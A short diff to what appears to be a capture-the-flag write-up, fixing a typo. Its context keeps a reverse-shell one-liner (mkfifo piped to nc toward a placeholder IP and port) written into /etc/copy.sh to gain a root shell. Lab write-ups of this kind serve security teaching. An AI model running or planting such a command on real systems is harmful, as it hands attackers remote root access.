@@ -59,5 +59,5 @@ so we edit it'containt to
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> <Port> >/tmp/f' >/etc/copy.sh
 ```
 
-and we get thr root shell
+and we get the root shell
 ![root](img/root_shell.png)
